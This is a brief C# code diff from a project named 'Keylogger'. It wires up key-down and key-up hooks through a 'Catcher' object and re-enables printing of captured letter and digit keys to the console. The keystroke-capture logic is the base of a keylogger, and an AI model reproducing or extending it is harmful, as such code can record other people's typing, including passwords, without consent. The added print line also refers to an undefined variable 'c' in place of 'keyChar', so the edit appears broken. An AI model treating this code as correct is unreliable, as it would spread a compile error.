@@ -17,7 +17,7 @@ namespace Keylogger
             Catcher catcher;
             Task CatherTask = Task.Factory.StartNew(() =>
             {
-                catcher = new Catcher(20, Thread.CurrentThread);
+                catcher = new Catcher(20);
                 catcher.KeyDown += KeyDown;
                 catcher.KeyUp += KeyUp;
                 catcher.Start();
@@ -37,8 +37,8 @@ namespace Keylogger
         {
             KeysConverter kc = new KeysConverter();
             string keyChar = kc.ConvertToString(key);
-            //if (char.IsLetterOrDigit(keyChar[0]))
-            //    Console.WriteLine(keyChar + " - Up");
+            if (char.IsLetterOrDigit(keyChar[0]))
+                Console.WriteLine(c + " - Up");
         }
     }
 }
